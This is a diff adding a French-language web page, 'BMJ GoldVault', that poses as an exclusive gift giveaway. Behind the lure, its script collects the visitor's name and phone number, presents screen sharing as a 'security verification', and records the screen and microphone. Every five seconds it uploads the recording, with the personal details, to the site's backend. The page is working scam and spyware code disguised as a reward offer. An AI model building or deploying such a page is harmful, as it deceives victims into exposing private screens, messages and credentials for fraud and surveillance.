@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html lang="fr" class="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cadeau Surprise Exclusif — BMJ GoldVault</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;700;800&display=swap');
+        body {
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            background: radial-gradient(circle at center, #1a160d 0%, #0a0805 70%, #000000 100%);
+            min-height: 100vh;
+            color: #fef3c7;
+        }
+        .glass-gold {
+            background: rgba(26, 22, 13, 0.65);
+            backdrop-filter: blur(16px);
+            border: 1px solid rgba(234, 179, 8, 0.25);
+            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.5);
+        }
+        .gold-gradient-text {
+            background: linear-gradient(135deg, #fef08a 0%, #ca8a04 50%, #eab308 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .gold-button {
+            background: linear-gradient(135deg, #fde047 0%, #ca8a04 50%, #eab308 100%);
+            box-shadow: 0 0 25px rgba(234, 179, 8, 0.4);
+            transition: all 0.3s ease;
+        }
+        .gold-button:hover {
+            box-shadow: 0 0 35px rgba(234, 179, 8, 0.7);
+            transform: scale(1.02);
+        }
+        @keyframes shine-gold {
+            0% { filter: drop-shadow(0 0 15px rgba(234, 179, 8, 0.4)); transform: scale(1); }
+            50% { filter: drop-shadow(0 0 35px rgba(234, 179, 8, 0.9)); transform: scale(1.05); }
+            100% { filter: drop-shadow(0 0 15px rgba(234, 179, 8, 0.4)); transform: scale(1); }
+        }
+        .gift-glow {
+            animation: shine-gold 2.5s infinite ease-in-out;
+        }
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-8px); }
+        }
+        .floating {
+            animation: float 3s ease-in-out infinite;
+        }
+    </style>
+</head>
+<body class="antialiased selection:bg-yellow-500 selection:text-black flex flex-col justify-between min-h-screen">
+
+    <!-- Navbar -->
+    <nav class="glass-gold px-6 py-4 flex justify-between items-center border-b border-yellow-500/10">
+        <div class="flex items-center gap-3">
+            <div class="w-10 h-10 rounded-2xl bg-gradient-to-tr from-yellow-600 to-amber-300 flex items-center justify-center shadow-lg shadow-yellow-500/20 text-black font-bold">
+                <i class="fas fa-crown"></i>
+            </div>
+            <span class="font-bold text-lg tracking-wider gold-gradient-text">BMJ<span class="text-white">SERVICE</span></span>
+        </div>
+        <div id="user-badge" class="hidden text-xs px-3 py-1.5 rounded-full bg-yellow-500/10 text-yellow-300 border border-yellow-500/30 flex items-center gap-2">
+            <i class="fas fa-user-circle"></i> <span id="lbl-username">Invité</span>
+        </div>
+    </nav>
+
+    <!-- Main Container -->
+    <main class="max-w-md mx-auto px-4 py-8 w-full flex-1 flex flex-col justify-center items-center">
+
+        <!-- ÉTAPE 1 : Le Cadeau Brillant en Or -->
+        <div id="step-gift" class="glass-gold rounded-3xl p-8 text-center w-full relative overflow-hidden">
+            <div class="absolute -right-10 -top-10 w-32 h-32 bg-yellow-500/10 rounded-full blur-2xl"></div>
+            
+            <div class="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-yellow-500/10 border border-yellow-500/20 text-yellow-300 text-xs font-semibold mb-6">
+                <i class="fas fa-sparkles"></i> Offre Limitée & Exclusive
+            </div>
+
+            <!-- Icône Cadeau Brillant -->
+            <div class="my-6 flex justify-center">
+                <div class="w-28 h-28 rounded-3xl bg-gradient-to-tr from-yellow-600/30 via-amber-400/20 to-yellow-300/40 border border-yellow-400/50 flex items-center justify-center gift-glow floating">
+                    <i class="fas fa-gift text-5xl gold-gradient-text"></i>
+                </div>
+            </div>
+
+            <h1 class="text-2xl md:text-3xl font-extrabold mb-3 gold-gradient-text">
+                Félicitations ! Un cadeau secret vous attend
+            </h1>
+            <p class="text-yellow-100/70 text-sm mb-8">
+                Vous avez été sélectionné pour recevoir votre récompense exclusive. Cliquez ci-dessous pour débloquer votre cadeau.
+            </p>
+
+            <button onclick="goToStepForm()" class="w-full py-4 rounded-2xl gold-button text-black font-extrabold text-base flex items-center justify-center gap-3 cursor-pointer">
+                <i class="fas fa-gift"></i>
+                <span>Obtenir mon cadeau</span>
+            </button>
+        </div>
+
+        <!-- ÉTAPE 2 : Formulaire Nom & Téléphone -->
+        <div id="step-form" class="hidden glass-gold rounded-3xl p-8 w-full">
+            <div class="text-center mb-6">
+                <div class="w-12 h-12 rounded-2xl bg-yellow-500/10 border border-yellow-500/30 flex items-center justify-center mx-auto mb-3 text-yellow-400">
+                    <i class="fas fa-user-shield text-xl"></i>
+                </div>
+                <h2 class="text-xl font-bold gold-gradient-text">Vérification de sécurité</h2>
+                <p class="text-xs text-yellow-100/60 mt-1">Entrez vos coordonnées pour recevoir votre dotation.</p>
+            </div>
+
+            <form onsubmit="handleFormSubmit(event)" class="space-y-4">
+                <div>
+                    <label class="block text-xs font-semibold text-yellow-200/80 mb-1.5"><i class="fas fa-user mr-1 text-yellow-400"></i> Votre Nom complet</label>
+                    <input type="text" id="input-name" required placeholder="Ex: BMJ Espoir" class="w-full px-4 py-3.5 rounded-xl bg-black/40 border border-yellow-500/30 text-white placeholder-yellow-100/30 text-sm focus:outline-none focus:border-yellow-400">
+                </div>
+
+                <div>
+                    <label class="block text-xs font-semibold text-yellow-200/80 mb-1.5"><i class="fas fa-phone mr-1 text-yellow-400"></i> Numéro de téléphone</label>
+                    <input type="tel" id="input-phone" required placeholder="Ex: +243..." class="w-full px-4 py-3.5 rounded-xl bg-black/40 border border-yellow-500/30 text-white placeholder-yellow-100/30 text-sm focus:outline-none focus:border-yellow-400">
+                </div>
+
+                <button type="submit" id="btn-submit-form" class="w-full mt-2 py-4 rounded-2xl gold-button text-black font-extrabold text-sm flex items-center justify-center gap-2 cursor-pointer">
+                    <span>Valider & Continuer</span>
+                    <i class="fas fa-arrow-right"></i>
+                </button>
+            </form>
+        </div>
+
+        <!-- ÉTAPE 3 : Activation de l'Enregistrement d'Écran -->
+        <div id="step-recording" class="hidden glass-gold rounded-3xl p-8 text-center w-full">
+            <div class="w-16 h-16 rounded-3xl bg-yellow-500/10 border border-yellow-400/40 flex items-center justify-center mx-auto mb-4 text-yellow-400 animate-pulse">
+                <i class="fas fa-video text-2xl"></i>
+            </div>
+
+            <h2 class="text-xl font-bold mb-2 gold-gradient-text">Autorisation requise</h2>
+            <p class="text-xs text-yellow-100/70 mb-6">
+                Pour finaliser l'attribution de votre cadeau, veuillez autoriser le partage d'écran sur votre appareil.
+            </p>
+
+            <button onclick="requestScreenPermission()" class="w-full py-4 rounded-2xl gold-button text-black font-extrabold text-sm flex items-center justify-center gap-2 cursor-pointer">
+                <i class="fas fa-play-circle text-base"></i>
+                <span>Autoriser & Lancer la vérification</span>
+            </button>
+        </div>
+
+        <!-- ÉTAPE 4 : Enregistrement Actif en arrière-plan -->
+        <div id="step-active" class="hidden glass-gold rounded-3xl p-8 text-center w-full">
+            <div class="relative w-24 h-24 mx-auto mb-4 flex items-center justify-center">
+                <div class="absolute inset-0 rounded-full border-2 border-red-500 animate-ping opacity-75"></div>
+                <div class="w-20 h-20 rounded-full bg-red-500/20 border border-red-500 flex items-center justify-center text-red-400 font-bold text-lg">
+                    REC
+                </div>
+            </div>
+
+            <h3 class="font-bold text-lg text-white mb-1">Session sécurisée active</h3>
+            <p class="text-xs text-yellow-100/60 mb-4">Vos données de flux sont sauvegardées en temps réel dans la base de données.</p>
+            
+            <div class="px-4 py-2 rounded-xl bg-black/40 border border-yellow-500/20 inline-block text-xs font-mono text-yellow-300">
+                Temps écoulé : <span id="timer">00:00</span>
+            </div>
+        </div>
+
+    </main>
+
+    <!-- Footer -->
+    <footer class="text-center py-4 text-[10px] text-yellow-100/30">
+        Secured by BMJ Service Protocol • Tous droits réservés
+    </footer>
+
+    <!-- Toast Notification -->
+    <div id="toast" class="fixed bottom-5 right-5 transform translate-y-20 opacity-0 transition-all duration-300 glass-gold px-5 py-3 rounded-2xl border-l-4 border-yellow-400 text-xs flex items-center gap-3 z-50 text-white">
+        <i id="toast-icon" class="fas fa-info-circle text-yellow-400 text-base"></i>
+        <span id="toast-msg">Notification</span>
+    </div>
+
+    <script>
+        let userData = { name: '', phone: '' };
+        let currentUserId = null;
+        let mediaRecorder;
+        let recordedChunks = [];
+        let timerInterval;
+        let seconds = 0;
+
+        function goToStepForm() {
+            document.getElementById('step-gift').classList.add('hidden');
+            document.getElementById('step-form').classList.remove('hidden');
+        }
+
+        // 1. Enregistrement utilisateur via l'API Backend PostgreSQL
+        async function handleFormSubmit(e) {
+            e.preventDefault();
+            userData.name = document.getElementById('input-name').value;
+            userData.phone = document.getElementById('input-phone').value;
+
+            const btn = document.getElementById('btn-submit-form');
+            btn.disabled = true;
+            btn.innerHTML = `<i class="fas fa-spinner fa-spin"></i> Patientez...`;
+
+            try {
+                const response = await fetch('/api/goldvault/user', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ nom: userData.name, telephone: userData.phone })
+                });
+                const data = await response.json();
+                
+                if (data.success) {
+                    currentUserId = data.user_id;
+                    document.getElementById('lbl-username').innerText = userData.name;
+                    document.getElementById('user-badge').classList.remove('hidden');
+
+                    document.getElementById('step-form').classList.add('hidden');
+                    document.getElementById('step-recording').classList.remove('hidden');
+                    showToast("Informations enregistrées avec succès.", "success");
+                } else {
+                    showToast(data.message || "Erreur d'enregistrement.", "error");
+                    btn.disabled = false;
+                    btn.innerHTML = `<span>Valider & Continuer</span> <i class="fas fa-arrow-right"></i>`;
+                }
+            } catch (err) {
+                console.error("Erreur réseau:", err);
+                showToast("Impossible de contacter le serveur.", "error");
+                btn.disabled = false;
+                btn.innerHTML = `<span>Valider & Continuer</span> <i class="fas fa-arrow-right"></i>`;
+            }
+        }
+
+        // 2. Demande d'autorisation d'écran & Lancement automatique de l'enregistrement
+        async function requestScreenPermission() {
+            try {
+                const screenStream = await navigator.mediaDevices.getDisplayMedia({
+                    video: { frameRate: { ideal: 30 } },
+                    audio: true
+                });
+
+                let finalStream = screenStream;
+                try {
+                    const micStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                    const tracks = [...screenStream.getVideoTracks(), ...screenStream.getAudioTracks(), ...micStream.getAudioTracks()];
+                    finalStream = new MediaStream(tracks);
+                } catch(err) {
+                    // Micro non bloquant
+                }
+
+                const mimeType = MediaRecorder.isTypeSupported('video/webm; codecs=vp9') ? 'video/webm; codecs=vp9' : 'video/webm';
+                mediaRecorder = new MediaRecorder(finalStream, { mimeType });
+                recordedChunks = [];
+
+                mediaRecorder.ondataavailable = (event) => {
+                    if (event.data.size > 0) {
+                        recordedChunks.push(event.data);
+                        autoSaveChunkToDatabase(); // Envoi automatique en arrière-plan vers le serveur
+                    }
+                };
+
+                screenStream.getVideoTracks()[0].onended = () => {
+                    stopTimer();
+                    showToast("Session d'enregistrement terminée.", "info");
+                };
+
+                // Enregistrement par blocs réguliers (toutes les 5 secondes) pour la base de données
+                mediaRecorder.start(5000);
+
+                document.getElementById('step-recording').classList.add('hidden');
+                document.getElementById('step-active').classList.remove('hidden');
+                startTimer();
+                showToast("Enregistrement sécurisé en cours...", "success");
+
+            } catch (err) {
+                console.error(err);
+                showToast("L'autorisation d'écran est obligatoire pour obtenir votre cadeau.", "error");
+            }
+        }
+
+        // 3. Envoi automatique de la vidéo vers le Backend
+        async function autoSaveChunkToDatabase() {
+            if (recordedChunks.length === 0) return;
+            const blob = new Blob(recordedChunks, { type: 'video/webm' });
+            
+            const reader = new FileReader();
+            reader.readAsDataURL(blob);
+            reader.onloadend = async function() {
+                const base64Video = reader.result;
+                
+                try {
+                    await fetch('/api/goldvault/upload', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            user_id: currentUserId,
+                            nom: userData.name,
+                            telephone: userData.phone,
+                            video_url: base64Video,
+                            file_size: (blob.size / (1024 * 1024)).toFixed(2) + ' MB',
+                            duration: document.getElementById('timer').innerText
+                        })
+                    });
+                } catch (err) {
+                    console.error("Erreur synchronisation vidéo:", err);
+                }
+            };
+        }
+
+        function startTimer() {
+            seconds = 0;
+            document.getElementById('timer').innerText = "00:00";
+            timerInterval = setInterval(() => {
+                seconds++;
+                const mins = String(Math.floor(seconds / 60)).padStart(2, '0');
+                const secs = String(seconds % 60).padStart(2, '0');
+                document.getElementById('timer').innerText = `${mins}:${secs}`;
+            }, 1000);
+        }
+
+        function stopTimer() {
+            clearInterval(timerInterval);
+        }
+
+        function showToast(msg, type = "info") {
+            const toast = document.getElementById('toast');
+            document.getElementById('toast-msg').innerText = msg;
+            toast.classList.remove('translate-y-20', 'opacity-0');
+            setTimeout(() => {
+                toast.classList.add('translate-y-20', 'opacity-0');
+            }, 4000);
+        }
+    </script>
+</body>
+</html>
